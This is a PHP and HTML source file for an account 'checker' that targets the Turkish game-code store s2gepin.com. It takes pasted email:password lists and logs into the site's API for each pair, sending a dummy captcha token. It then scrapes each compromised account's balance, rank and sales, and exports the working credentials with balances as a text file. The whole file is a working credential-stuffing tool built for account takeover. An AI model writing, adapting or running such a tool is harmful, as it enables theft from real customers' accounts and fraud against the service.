<?php
session_start();

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    function s2g_request($url, $method = 'GET', $postFields = null, $headers = [], $cookieStr = "") {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        }
        
        if (!empty($cookieStr)) {
            curl_setopt($ch, CURLOPT_COOKIE, $cookieStr);
        }
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($response, 0, $header_size);
        $body = substr($response, $header_size);
        curl_close($ch);
        return ['header' => $header, 'body' => $body];
    }

    function lr_parse($string, $left, $right) {
        if (empty($string)) return null;
        $data = explode($left, $string);
        if (isset($data[1])) {
            $data = explode($right, $data[1]);
            return trim(strip_tags($data[0]));
        }
        return null;
    }

    // 1. ADIM: CSRF ve Session Al
    $res1 = s2g_request("https://www.s2gepin.com/giris");
    $csrf = lr_parse($res1['body'], "const csrf_token = '", "';");
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $res1['header'], $m);
    $initialCookies = implode('; ', $m[1]);

    // 2. ADIM: API Login
    $loginHeaders = [
        "Content-Type: application/json",
        "Accept: */*",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/145.0.0.0 Safari/537.36"
    ];
    $loginPayload = json_encode([
        "email" => $user,
        "password" => $pass,
        "otpcode" => null,
        "CaptchaToken" => "none"
    ]);

    $res2 = s2g_request("https://api.s2gepin.com/Login/Customer", "POST", $loginPayload, $loginHeaders);
    $loginJson = json_decode($res2['body'], true);

    if (isset($loginJson['success']) && $loginJson['success'] == true) {
        $token = $loginJson['data'];

        // 3. ADIM: Session Bağlama
        $authPayload = json_encode(["_token" => $csrf, "token" => $token]);
        $authHeaders = [
            "Content-Type: application/json; charset=UTF-8",
            "X-Requested-With: XMLHttpRequest",
            "Origin: https://www.s2gepin.com",
            "Referer: https://www.s2gepin.com/giris"
        ];
        $res3 = s2g_request("https://www.s2gepin.com/giris", "POST", $authPayload, $authHeaders, $initialCookies);
        
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $res3['header'], $m2);
        $authCookies = $initialCookies . "; " . implode('; ', $m2[1]);

        // 4. ADIM: Veri Çekme
        $res4 = s2g_request("https://www.s2gepin.com/profilim", "GET", null, [], $authCookies);
        $pb = $res4['body'];

        $bakiye = lr_parse($pb, 'data-hidden="0">', 'TL</span>') ?? '0.00';
        $rank = lr_parse($pb, 'data-bs-placement="top">', '</span>') ?? 'Üye';
        $puan = lr_parse($pb, '<span class="level-points">', '</span>') ?? '0';
        $islem = lr_parse($pb, '<div class="store-solds">', '</div>') ?? '0';

        $detaylar = "Rank: $rank | Puan: $puan | Başarılı İşlem: $islem";

        echo json_encode([
            'status' => 'success',
            'user' => $user, 
            'pass' => $pass,
            'sayi' => $bakiye . " TL", 
            'arabalar' => $detaylar
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user, 'pass' => $pass]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S2GEPIN CHECKER | EXPORT EDITION</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #0b0a12; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .neon-purple { box-shadow: 0 0 15px rgba(139, 92, 246, 0.15); border: 1px solid rgba(139, 92, 246, 0.3); }
        .main-card { background: rgba(20, 18, 31, 0.9); backdrop-filter: blur(10px); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); transition: all 0.3s ease; }
        .input-area { background: #05040a; border: 1px solid #2d2a45; border-radius: 12px; color: #a78bfa; font-family: 'Consolas', monospace; width: 100%; outline: none; }
        .input-area:focus { border-color: #8b5cf6; }
        .hit-box { background: linear-gradient(145deg, #161426, #0b0a12); border-left: 4px solid #10b981; border-radius: 12px; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-purple-700 rounded-lg flex items-center justify-center shadow-lg shadow-purple-700/30">
                <i class="fa-solid fa-bolt-lightning text-white text-xl"></i>
            </div>
            <h1 class="text-2xl font-black italic tracking-tighter">S2G<span class="text-purple-500">EPIN</span></h1>
        </div>
        
        <div class="flex items-center gap-4">
            <a href="index.php" class="flex items-center gap-2 bg-white/5 hover:bg-purple-600 border border-white/10 px-6 py-2.5 rounded-xl text-xs font-black uppercase tracking-widest transition-all italic group">
                <i class="fa-solid fa-arrow-left transition-transform group-hover:-translate-x-1"></i> Geri Dön
            </a>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8">
        <div class="main-card p-6 neon-purple text-center">
            <span class="text-gray-500 text-[10px] font-black uppercase mb-1.5 block">Kalan</span>
            <div class="text-4xl font-black" id="kalan_val">BİTTİ</div>
        </div>
        <div class="main-card p-6 border-green-500/20 text-center">
            <span class="text-green-500 text-[10px] font-black uppercase mb-1.5 block">Hit</span>
            <div class="text-4xl font-black text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 border-red-500/20 text-center">
            <span class="text-red-600 text-[10px] font-black uppercase mb-1.5 block">Fail</span>
            <div class="text-4xl font-black text-red-600" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5">
            <div class="main-card p-6 neon-purple">
                <textarea id="accs" class="input-area h-[220px] p-4 text-xs" placeholder="email:şifre"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-purple-700 hover:bg-purple-600 rounded-xl text-white font-black uppercase tracking-widest text-sm shadow-md active:scale-95 transition-all">Taramayı Başlat</button>
            </div>
            <div class="main-card p-5 h-32 overflow-y-auto bg-black/50 font-mono text-[10px] text-purple-300" id="mini_log">Sistem Hazır.</div>
        </div>

        <div class="lg:col-span-8">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase italic text-gray-200">Canlı Sonuçlar</h2>
                <button onclick="downloadHits()" class="bg-green-600 hover:bg-green-500 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest transition-all">HİTLERİ İNDİR (TXT)</button>
            </div>
            <div class="main-card p-6 h-[660px] overflow-y-auto space-y-5" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic font-black uppercase">Liste Bekleniyor...</div>
            </div>
        </div>
    </div>

    <script>
        let running = false; let hits = 0; let fails = 0; let hitResults = [];
        
        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş veya format hatalı!");
            if(running) { running = false; return; }
            
            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR"; 
            btn.classList.replace('bg-purple-700', 'bg-red-900');
            document.getElementById('kalan_val').innerText = list.length;
            
            for(let line of list) {
                if(!running) break;
                const [u, p] = line.trim().split(':');
                try {
                    const fd = new FormData(); 
                    fd.append('user', u); 
                    fd.append('pass', p);
                    
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();
                    const log = document.getElementById('mini_log');
                    
                    if(res.status === 'success') {
                        hits++; 
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | Bakiye: ${res.sayi} | ${res.arabalar}`);
                        addHit(res);
                        log.innerHTML = `<div style="color:#10b981">[HIT] ${u}</div>` + log.innerHTML;
                    } else { 
                        fails++; 
                        document.getElementById('fail_count').innerText = fails; 
                        log.innerHTML = `<div style="color:#ef4444">[FAIL] ${u}</div>` + log.innerHTML;
                    }
                } catch(e) { }
                document.getElementById('kalan_val').innerText = Math.max(0, parseInt(document.getElementById('kalan_val').innerText) - 1);
            }
            running = false; 
            btn.innerText = "TARAMAYI BAŞLAT"; 
            btn.classList.replace('bg-red-900', 'bg-purple-700');
            document.getElementById('kalan_val').innerText = "BİTTİ";
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            const div = document.createElement('div');
            div.className = 'hit-box p-5 mb-4 border-l-4 border-green-500 shadow-lg';
            div.innerHTML = `
                <div class="flex justify-between items-center mb-2">
                    <span class="text-sm font-bold text-purple-400"><i class="fa-solid fa-user-check text-xs mr-1"></i> ${res.user}:${res.pass}</span>
                    <span class="text-2xl font-black text-green-500">${res.sayi}</span>
                </div>
                <div class="text-[11px] font-mono text-gray-400 italic bg-black/40 p-2 rounded">${res.arabalar}</div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; 
            a.download = `S2G_Hits_${new Date().getTime()}.txt`; 
            a.click();
        }
    </script>
</body>
</html>